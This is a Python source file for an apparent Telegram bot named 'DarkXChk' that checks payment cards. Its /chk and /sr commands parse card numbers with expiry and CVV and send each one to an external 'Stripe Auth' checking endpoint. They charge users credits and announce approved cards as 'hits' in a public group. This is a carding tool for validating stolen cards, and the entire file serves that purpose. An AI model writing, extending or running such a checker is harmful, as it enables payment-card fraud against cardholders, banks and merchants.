# gates/stripe/auth_gates.py
import re
import asyncio
import aiohttp
import time
import html
import logging
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from db import get_user, update_user
from bin import get_bin_info
from utils.decorators import enforce_cooldown
from utils.credits import consume_credit
from utils.helpers import escape_html, extract_cards_from_text
from utils.bullet import get_bullet_link, get_bullet2_link, get_developer_mention, get_user_mention
from force_join import force_join

logger = logging.getLogger(__name__)

# === CONFIG ===
AUTH_STRIPE_API = "lol="

# === GROUP IDs ===
PUBLIC_GROUP_ID = -1003814496328

# === SHARED CARD PATTERN ===
CARD_PATTERN = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

# ===== HIT DETECTOR  =====
async def send_hit(update: Update, context: ContextTypes.DEFAULT_TYPE, card: str, status: str, response: str, gateway: str):
    """Send Hit notification to public group and full card to private group."""
    user = update.effective_user
    user_mention = f'<a href="tg://user?id={user.id}">{html.escape(user.first_name or "User")}</a>'
    
    # ----- PUBLIC GROUP: Hit Detected -----
    bot_link = '<a href="https://t.me/chncexbot">DarkXChk</a>'
    hit_message = (
        f'<tg-emoji emoji-id="5219804923130038865">💎</tg-emoji> 𝑯𝑰𝑻 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅 <tg-emoji emoji-id="4916036072560919511">💎</tg-emoji>\n'
        f'━━━━━━━━\n'
        f'𝘜𝘴𝘦𝘳 <tg-emoji emoji-id="5125545114130712471">💎</tg-emoji> {user_mention}\n'
        f'𝘚𝘵𝘢𝘵𝘶𝘴 <tg-emoji emoji-id="5125545114130712471">💎</tg-emoji> {status}\n'
        f'𝘙𝘦𝘴𝘱𝘰𝘯𝘴𝘦 <tg-emoji emoji-id="5125545114130712471">💎</tg-emoji> {html.escape(response)}\n'
        f'𝘎𝘢𝘵𝘦𝘸𝘢𝙮 <tg-emoji emoji-id="5125545114130712471">💎</tg-emoji> {gateway}\n'
        f'━━━━━━━━\n'
        f'𝑯𝑰𝑻 𝑭𝒓𝒐𝒎 <tg-emoji emoji-id="5125546965261618614">💎</tg-emoji> {bot_link}'
    )
    try:
        await context.bot.send_message(chat_id=PUBLIC_GROUP_ID, text=hit_message, parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.error(f"❌ Failed to send Hit to public group: {e}")
   

# ===== STRIPE AUTH (/chk) =====
async def background_chk(cc_normalized, parts, user, user_data, processing_msg, update, context):
    """Background check for /chk command"""
    start_time = time.time()

    try:
        # BIN lookup
        bin_number = parts[0][:6]
        bin_details = await get_bin_info(bin_number) or {}

        brand = (bin_details.get("scheme") or "N/A").upper()
        type_ = (bin_details.get("type") or "N/A").upper()
        level = (bin_details.get("brand") or "N/A").upper()
        
        issuer = (
            bin_details.get("bank", "N/A")["name"]
            if isinstance(bin_details.get("bank"), dict)
            else bin_details.get("bank") or "N/A"
        )
        country_name = (
            bin_details.get("country", "N/A")["name"]
            if isinstance(bin_details.get("country"), dict)
            else bin_details.get("country") or "N/A"
        )
        country_flag = bin_details.get("country_emoji", "")

        # Call API
        api_url = AUTH_STRIPE_API + cc_normalized
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=78) as resp:
                if resp.status != 200:
                    raise Exception(f"HTTP {resp.status}")
                data = await resp.json()

        # Extract status + response
        api_status = (data.get("status") or "Unknown").strip()
        api_response = (data.get("response") or "No response").strip()

        # Status formatting
        lower_status = api_status.lower()
        if "approved" in lower_status:
            status_text = '𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 <tg-emoji emoji-id="5870702999180942496">💎</tg-emoji>'
            is_approved = True
        else:
            status_text = '𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅 <tg-emoji emoji-id="5855085385696156087">💎</tg-emoji>'
            is_approved = False

        # ✅ Hit if approved
        if is_approved:
            await send_hit(update, context, cc_normalized, "Approved", api_response, "Stripe Auth V1")

        # Time taken
        end_time = time.time()
        elapsed_time = round(end_time - start_time, 2)

        # Mentions
        dev_mention = get_developer_mention()
        user_mention = get_user_mention(user)

        # Final text (Updated as per user request)
        final_text = (
            f'[<tg-emoji emoji-id="5125437164422694571">💎</tg-emoji>] <b><i>Card</i></b> ➜ <code>{html.escape(cc_normalized)}</code>\n'
            f'━━━━━━━━━━━\n'
            f'[ﾒ] <b><i>Status</i></b> ➜ {status_text}\n'
            f'[ﾒ] <b><i>Response</i></b> ➜ <b><i>{html.escape(api_response)}</i></b>\n'
            f'[ﾒ] <b><i>Gateway</i></b> ➜ <b><i>Stripe Auth V1</i></b>\n'
            f'━━━━━━━━━━━\n'
            f'[ﾒ] <b><i>Info</i></b> ➜ <b><i>{html.escape(brand)} - {html.escape(type_)} - {html.escape(level)}</i></b>\n'
            f'[ﾒ] <b><i>Bank</i></b> ➜ <b><i>{html.escape(issuer)}</i></b>\n'
            f'[ﾒ] <b><i>Country</i></b> ➜ <b><i>{html.escape(country_name)} {html.escape(country_flag)}</i></b>\n'
            f'━━━━━━━━━━━\n'
            f'[<tg-emoji emoji-id="5134452506935427991">💎</tg-emoji>] <b><i>Checked By</i></b> ➜ {user_mention}\n'
            f'[<tg-emoji emoji-id="5852557780262592341">💎</tg-emoji>] <b><i>Dev</i></b> ➜ {dev_mention}'
        )

        await processing_msg.edit_text(
            final_text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )

    except Exception as e:
        await processing_msg.edit_text(
            f"❌ An error occurred: <code>{html.escape(str(e))}</code>",
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )

@force_join
async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe Auth - /chk command"""
    user = update.effective_user
    user_id = user.id

    user_data = await get_user(user_id)
    if not user_data:
        await update.effective_message.reply_text("❌ Could not fetch your user data.", parse_mode=ParseMode.HTML)
        return

    if user_data.get("credits", 0) <= 0:
        await update.effective_message.reply_text("❌ You have no credits left.", parse_mode=ParseMode.HTML)
        return

    if not await enforce_cooldown(user_id, update):
        return

    card_input = None

    if context.args and len(context.args) > 0:
        raw_text = " ".join(context.args)
        match = CARD_PATTERN.search(raw_text)
        if match:
            card_input = match.groups()

    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = CARD_PATTERN.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    if not card_input:
        usage_text = (
            "🚫 <b>Usage:</b> /chk card|mm|yy|cvv\n"
            "Or reply to a message containing a card."
        )
        await update.effective_message.reply_text(usage_text, parse_mode=ParseMode.HTML)
        return

    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)
    yy = yy[-2:] if len(yy) == 4 else yy
    cc_normalized = f"{card}|{mm}|{yy}|{cvv}"

    if not await consume_credit(user_id):
        await update.effective_message.reply_text("❌ No credits left.", parse_mode=ParseMode.HTML)
        return

    processing_text = (
        "<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
        f"<pre><code>{html.escape(cc_normalized)}</code></pre>\n"
        "𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↣ #𝗦𝘁𝗿𝗶𝗽𝗲𝗔𝘂𝘁𝗵"
    )

    status_msg = await update.effective_message.reply_text(
        processing_text,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )

    asyncio.create_task(
        background_chk(cc_normalized, [card, mm, yy, cvv], user, user_data, status_msg, update, context)
    )

# ===== STRIPE AUTH V2 (/sr) =====
async def background_sr(cc_normalized, parts, user, user_data, processing_msg, update, context):
    """Background check for /sr command"""
    # Same as background_chk
    await background_chk(cc_normalized, parts, user, user_data, processing_msg, update, context)

@force_join
async def sr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe Auth V2 - /sr command"""
    user = update.effective_user
    user_id = user.id

    user_data = await get_user(user_id)
    if not user_data:
        await update.effective_message.reply_text("❌ Could not fetch your user data.", parse_mode=ParseMode.HTML)
        return

    if user_data.get("credits", 0) <= 0:
        await update.effective_message.reply_text("❌ You have no credits left.", parse_mode=ParseMode.HTML)
        return

    if not await enforce_cooldown(user_id, update):
        return

    card_input = None

    if context.args and len(context.args) > 0:
        raw_text = " ".join(context.args)
        match = CARD_PATTERN.search(raw_text)
        if match:
            card_input = match.groups()

    elif update.message.reply_to_message and update.message.reply_to_message.text:
        match = CARD_PATTERN.search(update.message.reply_to_message.text)
        if match:
            card_input = match.groups()

    if not card_input:
        usage_text = (
            "🚫 <b>Usage:</b> /sr card|mm|yy|cvv\n"
            "Or reply to a message containing a card."
        )
        await update.effective_message.reply_text(usage_text, parse_mode=ParseMode.HTML)
        return

    card, mm, yy, cvv = card_input
    mm = mm.zfill(2)
    yy = yy[-2:] if len(yy) == 4 else yy
    cc_normalized = f"{card}|{mm}|{yy}|{cvv}"

    if not await consume_credit(user_id):
        await update.effective_message.reply_text("❌ No credits left.", parse_mode=ParseMode.HTML)
        return

    processing_text = (
        "<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
        f"<pre><code>{html.escape(cc_normalized)}</code></pre>\n"
        "𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↣ #𝗦𝘁𝗿𝗶𝗽𝗲𝗔𝘂𝘁𝗵"
    )

    status_msg = await update.effective_message.reply_text(
        processing_text,
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )

    asyncio.create_task(
        background_sr(cc_normalized, [card, mm, yy, cvv], user, user_data, status_msg, update, context)
    )
